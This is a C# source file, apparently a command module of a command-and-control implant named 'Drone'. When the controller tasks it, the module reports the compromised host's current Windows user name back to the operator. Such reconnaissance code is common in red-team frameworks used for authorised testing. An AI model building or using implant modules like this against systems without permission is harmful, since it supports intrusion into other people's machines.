using System.Security.Principal;
using System.Threading;
using System.Threading.Tasks;

namespace Drone.Commands;

public sealed class WhoAmI : DroneCommand
{
    public override byte Command => 0x1E;
    public override bool Threaded => true;

    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
    {
        using var identity = WindowsIdentity.GetCurrent();
        await Drone.SendTaskOutput(task.Id, identity.Name);
    }
}